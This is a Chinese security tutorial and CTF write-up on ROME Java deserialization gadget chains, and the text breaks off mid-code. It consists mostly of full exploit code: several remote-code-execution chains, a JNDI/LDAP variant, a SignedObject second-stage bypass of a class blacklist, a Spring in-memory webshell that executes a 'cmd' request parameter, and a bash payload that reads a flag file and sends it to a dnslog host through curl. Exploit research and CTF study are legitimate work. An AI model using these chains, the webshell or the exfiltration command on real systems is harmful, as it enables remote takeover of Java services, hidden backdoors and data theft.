# ROME

 **ROME是一组Atom/RSS工具类，它用Java来操作大部份RSS。ROME可能是目前最完善的开源聚合工具，ROME支持绝大多数的RSS协议。**

 **依赖**

    
    
    <dependency>
        <groupId>rome</groupId>
        <artifactId>rome</artifactId>
        <version>1.0</version>
    </dependency>
    

## 前置知识

### ToStringBean

再Rome包中的`com.sun.syndication.feed.impl.ToStringBean`类中，提供了`toString()`方法，其中有两个`toString()`一个有参一个无参，先看下无参的

获取_obj属性的类名，并作为参数，传入有参`toString()`

![wKg0C2RIuR6ADgaAAB5qwFmrDI400.png](https://image.3001.net/images/20230606/1686032644_647ed10465c06eb2bdca8.png!small)

 **而在有参方法中会执行三步操作**

![wKg0C2RIuSeALNaAACgJpLvSFg799.png](https://image.3001.net/images/20230606/1686032644_647ed104ee1374b365a64.png!small)

1、getPropertyDescriptors，获取`_beanClass`中的getter、setter方法，跟进看一下

其中会调用`getPDs()`

![wKg0C2RIuZKAUknZAABICIOLnV4022.png](https://image.3001.net/images/20230606/1686032645_647ed1058c551393cdfb7.png!small)

跟进`getPDs()`，又调用了其他有参构造获取了其中的getter、setter方法，之后将其合并赋给list属性pds，并将其转换为数组形式返回

![wKg0C2RIuZuAE8hVAADcgMLPWVk133.png](https://image.3001.net/images/20230606/1686032646_647ed106577f113422ee7.png!small)

2、获取pds返回值中的方法名和方法

3、反射调用该方法_obj类的该方法

触发_obj的所有getter方法，并且_obj和_beanClass在控制器中都可初始化赋值，这就可以想到`CommonsBeanutils`中的`getOutputProperties`，它会调用`newtransform()`，进而触发TemplatesImpl
利用链，那么现在的问题就是如何调用toString了

### EqualsBean

 **在EqualsBean的beanHashCode()中调用了_obj的**`toString()`方法，并且_
**obj可控，就可以直接调用到ToStringBean的toString()方法**

![wKg0C2RIubWAcmLIAAAabmpGtO4142.png](https://image.3001.net/images/20230606/1686032646_647ed106ee6b91abcaf0f.png!small)

因此就需要寻找哪里调用了`beanHashCode()`

除此外EqualsBean中还有个`beanEquals()`方法，同样调用了反射，这个后面再谈

![wKg0C2RIucGAU6iWAAChYXlWiL4560.png](https://image.3001.net/images/20230606/1686032647_647ed1076f9f00d574838.png!small)

### ObjectBean

在ObeanBean的hashCode()中调用了_equalsBean的`beanHashCode()`方法，并且_equalsBean可控

![wKg0C2RIudaAJu7cAAAZHo0wI4347.png](https://image.3001.net/images/20230606/1686032647_647ed107f34b533968972.png!small)

这就可以联想到HashMap中的hashcode()方法

## ObjectBean链

 **这条链是Rome反序列化的原型，由ysoserial 作者提出**

    
    
    TemplatesImpl.getOutputProperties()
    ToStringBean.toString(String)
    ToStringBean.toString()
    EqualsBean.beanHashCode()
    EqualsBean.hashCode()
    HashMap<K,V>.hash(Object)
    HashMap<K,V>.readObject(ObjectInputStream)
    

**构造一个恶意类**

    
    
    public class Evil extends AbstractTranslet {
        public Evil(){
            try {
                Runtime.getRuntime().exec("calc");
            } catch (IOException e) {
    
            }
        }
    
        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    
        }
    
        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    
        }
    }
    

**后续用到的工具类**

    
    
    public class Tools {
        public static byte[] getBytes(String byteName) throws NotFoundException, IOException, CannotCompileException {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.get(byteName);
            byte[] bytes = ctClass.toBytecode();
            return bytes;
        }
        public static void setFieldValue(Object o, String fieldName, Object value) throws Exception {
            Field field = o.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(o,value);
        }
        public static byte[] serialize(Object o) throws IOException {
            ByteArrayOutputStream bao = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bao);
            oos.writeObject(o);
            return bao.toByteArray();
        }
    
        public static void unserialize(byte[] b) throws IOException, ClassNotFoundException {
            ByteArrayInputStream bis = new ByteArrayInputStream(b);
            ObjectInputStream ois = new ObjectInputStream(bis);
            ois.readObject();
        }
    }
    

### 利用链构造

 **首先先构造Templatesimpl链，并将恶意类的字节码存入其中**

    
    
    byte[] bytes = getBytes("Rome.Evil");
    TemplatesImpl templates = new TemplatesImpl();
    setFieldValue(templates, "_name", "Sentiment");
    setFieldValue(templates, "_class", null);
    setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
    

之后就是构造ToStringBean的`toString()`部分，可以通过构造器初始化两个属性的值

![wKg0C2RIueaAR1VRAAB4HhcT0A756.png](https://image.3001.net/images/20230606/1686032648_647ed1085ffc6f6310322.png!small)

 **由于需要获取_beanClass类的getter、setter方法，也就是获取**`getOutputProperties()`，因此就需要_
**beanClass是Templates的class类，而** _
**obj由于需要进行反射调用，因此它必须是已经存入恶意字节码的Templates类，即：**

    
    
    ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
    

**接着到EqualsBean部分，同样需要修改_obj的值，将其修改为ToStringBean类型，才能调用到对应的**`toString()`

    
    
    public int beanHashCode() {
        return _obj.toString().hashCode();
    }
    

**初始化EqualsBean**

    
    
    EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
    

**因此这里只需要，将对应的obj修改为ToStringBean即可，即：**

    
    
    ObjectBean objectBean = new ObjectBean(Object.class, equalsBean);
    

**这里的只用到了_obj，因此beanClass随意赋值一个类型即可**

 **接着就是修改HashMap了，因为HashMap的readObject方法中调用了**`hash()`的方法，继而调用了hashCode()

![wKg0C2RIufuACLQDAACOQIzwc0907.png](https://image.3001.net/images/20230606/1686032649_647ed1091010e7f52ae35.png!small)

调用了`hash()`，接着调用了key的`hashCode()`，因此就需要构造key为ObjectBean类型，即：

    
    
    ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
    ObjectBean objectBean = new ObjectBean(Object.class, toStringBean);
    HashMap hashMap = new HashMap();
    hashMap.put(objectBean, "1");
    

**最后调用HashMap的readObject()方法成功执行反序列化**

但需注意在我们使用HashMap的`put()`时，会调用hash() ->
hashCode()，因此需要put时先传入无害数据，在通过反射来修改`_equalsBean`为恶意的。

 **POC：**

    
    
    public class Rome_ObjectBean {
        public static void main(String[] args) throws Exception {
            byte[] bytes = getBytes("Rome.Evil");
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_name", "Sentiment");
            setFieldValue(templates, "_class", null);
            setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
    
            ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
            EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
            ObjectBean objectBean = new ObjectBean(Object.class, "Sentiment");
            HashMap hashMap = new HashMap();
            hashMap.put(objectBean, "1");
            setFieldValue(objectBean,"_equalsBean",equalsBean);
            byte[] serialize = serialize(hashMap);
            unserialize(serialize);
        }
    }
    

除此外Hashtable的`readObject()`最终同样可以触发`hashCode()`，因此同样适用

![wKg0C2RIuhCALCBsAACh5bfSGlI720.png](https://image.3001.net/images/20230606/1686032649_647ed10976b3780834de0.png!small)

 **POC：**

    
    
    public class Rome_ObjectBean {
        public static void main(String[] args) throws Exception {
            byte[] bytes = getBytes("Rome.Evil");
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_name", "Sentiment");
            setFieldValue(templates, "_class", null);
            setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
    
            ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
            EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);
            ObjectBean objectBean = new ObjectBean(Object.class, "Sentiment");
            Hashtable hashtable = new Hashtable();
            hashtable.put(objectBean, "1");
            setFieldValue(objectBean,"_equalsBean",equalsBean);
            byte[] serialize = serialize(hashtable);
            unserialize(serialize);
        }
    }
    

# 其他调用链

## 1、BadAttributeValueExpException

想到toString就一定能想到BadAttributeValueExpException的readobject()，它在最后调用了`toString()`方法，并且它的val属性我们可以通过反射修改，那就可以直接触发到ToStringBean中的此方法

![wKg0C2RIuiOAV81fAACMjpkWKfw089.png](https://image.3001.net/images/20230606/1686032649_647ed109f3d617f963784.png!small)

 **POC:**

    
    
    public class Rome_BadAttributeValueExpException {
        public static void main(String[] args) throws Exception {
            byte[] bytes = getBytes("Rome.Evil");
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_name", "Sentiment");
            setFieldValue(templates, "_class", null);
            setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
    
            ToStringBean toStringBean = new ToStringBean(Templates.class, templates);
            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
            setFieldValue(badAttributeValueExpException,"val",toStringBean);
            byte[] serilize = serilize(badAttributeValueExpException);
            unserilize(serilize);
        }
    }
    

## 2、HotSwappableTargetSource

在XString的`equals()`方法中，会调用obj2的`toString()`，假如构造obj2为ToStringBean类型就能RCE

![wKg0C2RIujKAKfRXAACK0cYw1Oo880.png](https://image.3001.net/images/20230606/1686032650_647ed10a7551dc50a6f24.png!small)

因此现在就需要找哪里调用了`equals()`，并且其中的参数可控

再HotSwappableTargetSource中找到了`equals()`，并且参数是target，通过有参构造就能修改。

![wKg0C2RIupKAMfW0AACNol1lBMo090.png](https://image.3001.net/images/20230606/1686032650_647ed10ae14608e2ed918.png!small)

但需注意，这里`equals()`前后有两个target，这就需要构造两个HotSwappableTargetSource实例，左边为XString，右边为ToStringBean

继续寻找哪里调用`equals()`，这里还可以用HashMap的readObject()

![wKg0C2RIuqCAAn8sAACtXSfEmDw189.png](https://image.3001.net/images/20230606/1686032651_647ed10b9c5ae20b87069.png!small)

 **POC：**

    
    
    public class Rome_HotSwappableTargetSource {
        public static void main(String[] args) throws Exception{
            byte[] bytes = getBytes("Rome.Evil");
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_name", "Sentiment");
            setFieldValue(templates, "_class", null);
            setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
    
            ToStringBean toStringBean = new ToStringBean(Templates.class,templates);
            HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(new XString("1"));
            HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(toStringBean);
            HashMap hashMap = new HashMap();
            hashMap.put(hotSwappableTargetSource2,"1");
            hashMap.put(hotSwappableTargetSource1,"1");
            byte[] serialize = serialize(hashMap);
            unserialize(serialize);
        }
    }
    

## 3、JdbcRowSetImpl链

在JdbcRowSetImpl的`getDatabaseMetaData()`会调用`connect()`，触发`lookup()`进行远程类加载

![wKg0C2RIuqyAZ3V2AACmiFl46oc581.png](https://image.3001.net/images/20230606/1686032652_647ed10c3383ef7ccc4f5.png!small)

 **lookup()中参数可控，可通过对应的Setter方法进行赋值**

![wKg0C2RIurOAfz8AABdF2rjMBs983.png](https://image.3001.net/images/20230606/1686032652_647ed10cabfb194c23427.png!small)

接着由于`getDatabaseMetaData()`是以`get`开头，因此在ToStringBean的`toString()`，可通过循环反射调用，而触发方式仍然为HashMap调用`hashCode()`的方式

这里同样要注意`put()`时，会调用`hashCode()`，因此需要修改equalsBean的内容为无害数据，但构造后发现，EqualsBean的构造器再赋值前，会进行判断beanClass是否为obj的子类，否则会抛异常

![wKg0C2RIuseACuMtAAAwq10cdO0386.png](https://image.3001.net/images/20230606/1686032653_647ed10d854d6e32b82e1.png!small)

 **因此直接将toStringBean初始化赋值进行修改即可，即：**

    
    
    ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class, "Sentiment");
    

**或者再初始化一个无害EqualsBean也可，之后再将对应的_obj用反射修改回来**

    
    
    setFieldValue(toStringBean,"_obj",jdbcRowSet);
    

**开启本地服务**

    
    
    python -m http.server 7777
    

**使用marshalsec构建LDAP服务,服务端监听:**

    
    
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:7777/#Evil 9999
    

**POC：**

    
    
    public class Rome_JdbcRowSetImpl {
        public static void main(String[] args) throws Exception {
            JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
            jdbcRowSet.setDataSourceName("ldap://127.0.0.1:9999/Evil");
    
            ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class, "Sentiment");
            EqualsBean equalsBean=new EqualsBean(ToStringBean.class,toStringBean);
            HashMap hashMap = new HashMap();
            hashMap.put(equalsBean,"1");
            setFieldValue(toStringBean,"_obj",jdbcRowSet);
            byte[] serialize = serialize(hashMap);
            unserialize(serialize);
        }
    }
    

## 4、无ToStringBean链

**前边的所有方式都用到了ToStringBean这条链，但若该类被加入了黑名单，则可用前边EqualsBean中提到的**`beanEquals()`方法

![wKg0C2RIutGAYANdAACWiyhZ2B4857.png](https://image.3001.net/images/20230606/1686032654_647ed10e55f0991db23c9.png!small)

该方法在EqualsBean的`equals()`中会调用，因此这里就需要找到哪里调用了`equals()`即可，这就联想到了CC7的调用链

    
    
    Hashtable.readObject()
    Hashtable.reconstitutionPut()
    AbstractMapDecorator.equals()
    AbstractMap.equals()
    

在readObject中，elements的值为2，这就表示下方我们会循环调用两次`reconstitutionPut()`

![wKg0C2RIut6AMVSWAACr0hVHQI8844.png](https://image.3001.net/images/20230606/1686032654_647ed10ec8c93d4c643ce.png!small)

 **先看第一次再for循环初始化时，会将tab[index]的值赋给e，而tab此时为空，所以就跳过了for循环，并在下方给tab赋值**

![wKg0C2RIuuaAZY7xAABuHuTjBKc694.png](https://image.3001.net/images/20230606/1686032655_647ed10f5059a2e21e069.png!small)

 **第二次进入到了for中，但要求e.hash==hash，否则就不会执行equals**

![wKg0C2RIuu2ABOH5AAB8HHsX7Y0351.png](https://image.3001.net/images/20230606/1686032655_647ed10fd6fa4135edf7c.png!small)

用CC7中的`zZ`、`yy`绕过即可，因为它俩的hash相等

    
    
    map1.put("zZ",1);
    map2.put("yy",1);
    

但这里还需要做一些修改，调用的是value的`equals()`，因此value要设置为`EqualsBean`类型，而`equals()`中的参数在`beanEquals()`中会判断是否为_beanClass的子类或子类实例，`_beanClass`根据前边的经验是Templates类型的，因此`equals()`中的参数也要是`Templates`类型

![wKg0C2RIuwGAHW4AAACtir0RUA4479.png](https://image.3001.net/images/20230606/1686032656_647ed11072ed29200fe94.png!small)

 **因此需要将上述提到的两个类存入map中**

    
    
    map1.put("yy",equalsBean);
    map1.put("zZ",templates);
    map2.put("zZ",equalsBean);
    map2.put("yy",templates);
    

**之后是EqualsBean初始化部分，若按以前配置方式应该为：**

    
    
    EqualsBean equalsBean = new EqualsBean(Templates.class, templates);
    

但这样设置后仍会在map的`put()`执行，而这里执行后会抛出异常结束进程，就导致了无法走到readObject的部分，因此同样先设置一个无害参数，在通过反射在最后修改回来

    
    
    public class Rome_EqualsBean {
        public static void main(String[] args) throws Exception {
            byte[] bytes = getBytes("Rome.Evil");
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_name", "Sentiment");
            setFieldValue(templates, "_class", null);
            setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
    
            EqualsBean equalsBean = new EqualsBean(Templates.class, templates);
            HashMap map1 = new HashMap();
            HashMap map2 = new HashMap();
            map1.put("yy",equalsBean);
            map1.put("zZ",templates);
            map2.put("zZ",equalsBean);
            map2.put("yy",templates);
            Hashtable hashtable = new Hashtable();
            hashtable.put(map1,"1");
            hashtable.put(map2,"1");
    
            setFieldValue(equalsBean,"_beanClass",Templates.class);
            setFieldValue(equalsBean,"_obj",templates);
            byte[] serialize = serialize(hashtable);
            unserialize(serialize);
        }
    }
    

**HashMap同样适用**

    
    
    public class Rome_EqualsBean {
        public static void main(String[] args) throws Exception {
            byte[] bytes = getBytes("Rome.Evil");
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_name", "Sentiment");
            setFieldValue(templates, "_class", null);
            setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
    
            EqualsBean equalsBean = new EqualsBean(String.class, "Sentiment");
            HashMap map1 = new HashMap();
            HashMap map2 = new HashMap();
            map1.put("yy",equalsBean);
            map1.put("zZ",templates);
            map2.put("zZ",equalsBean);
            map2.put("yy",templates);
            HashMap hashMap = new HashMap();
            hashMap.put(map1,"1");
            hashMap.put(map2,"1");
    
            setFieldValue(equalsBean,"_beanClass",Templates.class);
            setFieldValue(equalsBean,"_obj",templates);
            byte[] serialize = serialize(hashMap);
            unserialize(serialize);
        }
    }
    

# 二次反序列化

二次反序列化，顾名思义，就是反序列化两次，其主要意义是 **绕过黑名单的限制或不出网利用** ，前不久在一场CTF中遇到了二次反序列化，借此简单了解下。

## SignedObject

Rome二次反序列化主要源于`java.security`中的SignedObject类，它的构造器中就默认实现了序列化的功能

![wKg0C2RIuxOAZ7JkAACUGqPYkik809.png](https://image.3001.net/images/20230606/1686032657_647ed1110079f08d5cd9a.png!small)

而它的`getObject()`又实现了反序列化，并且其中的参数content是通过构造器可控的

![wKg0C2RIuyuACbB0AABZoAJnWZI286.png](https://image.3001.net/images/20230606/1686032657_647ed11178fa878449d9b.png!small)

之后就可以构造恶意`SignedObject`，将之前的恶意hashMap存入SignedObject，对其触发序列化

    
    
    byte[] bytes = getBytes("Rome.Evil");
    TemplatesImpl templates = new TemplatesImpl();
    setFieldValue(templates, "_name", "Sentiment");
    setFieldValue(templates, "_class", null);
    setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
    
    ToStringBean toStringBean1 = new ToStringBean(Templates.class, templates);
    EqualsBean equalsBean1 = new EqualsBean(ToStringBean.class, toStringBean1);
    ObjectBean objectBean1 = new ObjectBean(Object.class, "Sentiment");
    
    HashMap hashMap = new HashMap();
    hashMap.put(objectBean1, "1");
    setFieldValue(objectBean1,"_equalsBean",equalsBean1);
    
    KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
    kpg.initialize(1024);
    KeyPair kp = kpg.generateKeyPair();
    SignedObject signedObject = new SignedObject(hashMap, kp.getPrivate(), Signature.getInstance("DSA"));
    

**之后就是调用getObject方法触发反序列化执行命令了，思路跟前边一样，通过ToStringBean调用getter的机制触发即可**

    
    
    ToStringBean toStringBean2 = new ToStringBean(SignedObject.class, signedObject);
    EqualsBean equalsBean2 = new EqualsBean(ToStringBean.class, toStringBean2);
    ObjectBean objectBean2 = new ObjectBean(Object.class, "Sentiment");
    HashMap hashMap1 = new HashMap();
    hashMap1.put(objectBean2, "1");
    setFieldValue(objectBean2,"_equalsBean",equalsBean2);
    
    byte[] serialize = serialize(hashMap1);
    unserialize(serialize);
    

**POC：**

    
    
    public class Rome_SignedObject {
        public static void main(String[] args) throws Exception {
            byte[] bytes = getBytes("Rome.Evil");
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_name", "Sentiment");
            setFieldValue(templates, "_class", null);
            setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
    
            ToStringBean toStringBean1 = new ToStringBean(Templates.class, templates);
            EqualsBean equalsBean1 = new EqualsBean(ToStringBean.class, toStringBean1);
            ObjectBean objectBean1 = new ObjectBean(Object.class, "Sentiment");
    
            HashMap hashMap = new HashMap();
            hashMap.put(objectBean1, "1");
            setFieldValue(objectBean1,"_equalsBean",equalsBean1);
    
            KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
            kpg.initialize(1024);
            KeyPair kp = kpg.generateKeyPair();
            SignedObject signedObject = new SignedObject(hashMap, kp.getPrivate(), Signature.getInstance("DSA"));
    
            ToStringBean toStringBean2 = new ToStringBean(SignedObject.class, signedObject);
            EqualsBean equalsBean2 = new EqualsBean(ToStringBean.class, toStringBean2);
            ObjectBean objectBean2 = new ObjectBean(Object.class, "Sentiment");
            HashMap hashMap1 = new HashMap();
            hashMap1.put(objectBean2, "1");
            setFieldValue(objectBean2,"_equalsBean",equalsBean2);
    
            byte[] serialize = serialize(hashMap1);
            unserialize(serialize);
        }
    }
    

# CTF—JavaMonster

 **接着看下前两天遇到的Java题**

 **主要分为三部分**

![wKg0C2RIuzqAIEZiAACofA56LwM321.png](https://image.3001.net/images/20230606/1686032657_647ed111ed06013d5ab5e.png!small)

 **1：获取Cookie中索引为1的值，并进行jwt解密，要求等于Boogipop，由于出题人已经给出了JWT脚本，因此修改下值即可**

 **2：hashCode绕过，要求s不等于**`Try to solve EasyJava`，但hashCode要等于`Try to solve
EasyJava`

 **hashCode的逻辑是：**

    
    
    public int hashCode() {
        int h = hash;
        if (h == 0 && value.length > 0) {
            char val[] = value;
    
            for (int i = 0; i < value.length; i++) {
                h = 31 * h + val[i];
            }
            hash = h;
        }
        return h;
    }
    

**用个例子简单看下**

    
    
    //97
    "a".hashCode()
    
    //97*31+98=3105
    "ab".hahsCode()
    
    //3105*31+99=96354
    "abc".hashCode()
    

ab的hashCode = ("a"的ascii码*31)+("b"的ascii码)，abc同理是`"ab"*31 +
"c"`，按照此计算规则假设我将"ab"改为"bC"，那么它的hashcode = 98*31+67=3105，与ab相等

 **按此计算"USy to solve EasyJava".hashCode() == "Try to solve
EasyJava".hashCode()，便可绕过这里**

 **3：在进行反序列化前，执行了MyownObjectInputStream的一步操作**

![wKg0C2RIu0qAMzfWAADaFzlGnIo053.png](https://image.3001.net/images/20230606/1686032658_647ed1127265c86ed79c0.png!small)

即使本地有Rome依赖，但基本都被加入了黑明单，这时看到了另一个类`HDCTF`，其中两个函数完成功能与SignedObject中的基本一致，所以直接考虑二次反序列化绕过黑名单

![wKg0C2RIu1qADQvoAAB6tIiFbuo474.png](https://image.3001.net/images/20230606/1686032659_647ed1130ea3492f8dccf.png!small)

**根据上边黑名单发现EqualsBean、ObjectBean没被ban，所以考虑外层反序列化的内容用无ToStringBean链，而Templates封装到第二层序列化中即可绕过**

    
    
    import com.ctf.easyjava.hdctf.HDCTF;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.syndication.feed.impl.EqualsBean;
    import javassist.ClassPool;
    import javassist.CtClass;
    import javassist.CtConstructor;
    
    import javax.xml.transform.Templates;
    
    import java.util.Base64;
    import java.util.HashMap;
    
    import static com.ctf.easyjava.Tools.*;
    
    public class Rome_CTF {
        public static void main(String[] args) throws Exception{
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.makeClass("i");
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            CtConstructor constructor = ctClass.makeClassInitializer();
            constructor.setBody("Runtime.getRuntime().exec(\"calc.exe\");");
            byte[] bytes = ctClass.toBytecode();
    
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_name", "Sentiment");
            setFieldValue(templates, "_class", null);
            setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
    
            EqualsBean equalsBean1 = new EqualsBean(String.class, "Sentiment");
            HashMap map1 = new HashMap();
            HashMap map2 = new HashMap();
            map1.put("yy",equalsBean1);
            map1.put("zZ",templates);
            map2.put("zZ",equalsBean1);
            map2.put("yy",templates);
            HashMap hashMap1 = new HashMap();
            hashMap1.put(map1,"1");
            hashMap1.put(map2,"1");
    
            setFieldValue(equalsBean1,"_beanClass",Templates.class);
            setFieldValue(equalsBean1,"_obj",templates);
    
            HDCTF hdctf = new HDCTF(hashMap1);
    
            EqualsBean equalsBean2 = new EqualsBean(String.class, "Sentiment");
            HashMap map3 = new HashMap();
            HashMap map4 = new HashMap();
            map3.put("yy",equalsBean2);
            map3.put("zZ",hdctf);
            map4.put("zZ",equalsBean2);
            map4.put("yy",hdctf);
            HashMap hashMap2 = new HashMap();
            hashMap2.put(map3,"1");
            hashMap2.put(map4,"1");
    
            setFieldValue(equalsBean2,"_beanClass",HDCTF.class);
            setFieldValue(equalsBean2,"_obj",hdctf);
    
            byte[] serialize = serialize(hashMap2);
            String s = Base64.getEncoder().encodeToString(serialize);
            System.out.println(s);
        }
    }
    

**传参本地测试成功**

![wKg0C2RIu2yAJMtGAAEPOSPHN5w866.png](https://image.3001.net/images/20230606/1686032659_647ed1138ffc6fea9ecdc.png!small)

## 预期解

 **但这个题目设置了不出网，因此首先考虑打Spring内存马**

    
    
    package com.ctf.easyjava;
    
    import com.sun.org.apache.xalan.internal.xsltc.DOM;
    import com.sun.org.apache.xalan.internal.xsltc.TransletException;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
    import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
    import org.springframework.web.context.WebApplicationContext;
    import org.springframework.web.context.request.RequestContextHolder;
    import org.springframework.web.context.request.ServletRequestAttributes;
    import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
    import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
    import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
    
    import javax.servlet.http.HttpServletRequest;
    import javax.servlet.http.HttpServletResponse;
    import java.io.IOException;
    import java.io.PrintWriter;
    import java.lang.reflect.Field;
    import java.lang.reflect.InvocationTargetException;
    import java.lang.reflect.Method;
    
    public class InjectToController extends AbstractTranslet {
    
        // 第一个构造函数
        public InjectToController() throws ClassNotFoundException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
            configField.setAccessible(true);
            RequestMappingInfo.BuilderConfiguration config =(RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
            Method method2 = InjectToController.class.getMethod("test");
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
            RequestMappingInfo info = RequestMappingInfo.paths("/shell")
                    .options(config)
                    .build();
            InjectToController springControllerMemShell = new InjectToController("aaa");
            mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);
        }
    
        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    
        }
    
        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    
        }
    
        // 第二个构造函数
        public InjectToController(String aaa) {}
    
        // controller指定的处理方法
        public void test() throws  IOException{
            // 获取request和response对象
            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
    
            //exec
            try {
                String arg0 = request.getParameter("cmd");
                PrintWriter writer = response.getWriter();
                if (arg0 != null) {
                    String o = "";
                    java.lang.ProcessBuilder p;
                    if(System.getProperty("os.name").toLowerCase().contains("win")){
                        p = new java.lang.ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});
                    }else{
                        p = new java.lang.ProcessBuilder(new String[]{"/bin/sh", "-c", arg0});
                    }
                    java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("A");
                    o = c.hasNext() ? c.next(): o;
                    c.close();
                    writer.write(o);
                    writer.flush();
                    writer.close();
                }else{
                    //当请求没有携带指定的参数(code)时，返回 404 错误
                    response.sendError(404);
                }
            }catch (Exception e){}
        }
    
    }
    

**生成字节码文件后，将上边弹calc的代码换为**

    
    
    FileInputStream fis =new FileInputStream("D:\\InjectToController.class");
    byte[] bytes = new byte[fis.available()];
    fis.read(bytes);
    

**重新传参，成功注入内存马**

![wKg0C2RIu3aAdJvuAAAa0nzMn8Q944.png](https://image.3001.net/images/20230606/1686032660_647ed11456ca17ef211fb.png!small)

## 非预期

其实在最初能执行命令后，有测试过本题是否出网，可能是ngnix反代设置有问题，虽然不通vps，但测试中发现通过curl命令可以将信息外带到dnslog中，但这时又遇到了问题，dnslog回显信息中不支持换行和特殊字符，这就导致无法执行大部分命令。

于是请教了[K0e1y](https://www.sec-in.com/author/5390)师傅，他想到了通过循环外带的方式解决了这个问题

 **POC：**

    
    
    import com.ctf.easyjava.hdctf.HDCTF;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import com.sun.syndication.feed.impl.EqualsBean;
    import javassist.ClassPool;
    import javassist.CtClass;
    import javassist.CtConstructor;
    
    import javax.xml.transform.Templates;
    
    import java.util.Base64;
    import java.util.HashMap;
    
    import static com.ctf.easyjava.Tools.*;
    
    public class Rome_CTF {
        public static void main(String[] args) throws Exception{
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.makeClass("i");
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            CtConstructor constructor = ctClass.makeClassInitializer();
            constructor.setBody("Runtime.getRuntime().exec(new String[]{\"/bin/bash\", \"-c\", \"cat /flag_is_is_here | while read line; do echo $line.iny9ev.dnslog.cn | xargs curl; done\"});");
            byte[] bytes = ctClass.toBytecode();
    
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_name", "Sentiment");
            setFieldValue(templates, "_class", null);
            setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
    
            EqualsBean equalsBean1 = new EqualsBean(String.class, "Sentiment");
            HashMap map1 = new HashMap();
            HashMap map2 = new HashMap();
            map1.put("yy",equalsBean1);
            map1.put("zZ",templates);
            map2.put("zZ",equalsBean1);
            map2.put("yy",templates);
            HashMap hashMap1 = new HashMap();
            hashMap1.put(map1,"1");
            hashMap1.put(map2,"1");
    
            setFieldValue(equalsBean1,"_beanClass",Templates.class);
            setFieldValue(equalsBean1,"_obj",templates);
    
            HDCTF hdctf = new HDCTF(hashMap1);
    
            EqualsBean equalsBean2 = new EqualsBean(String.class, "Sentiment");
            HashMap map3 = new HashMap();﻿

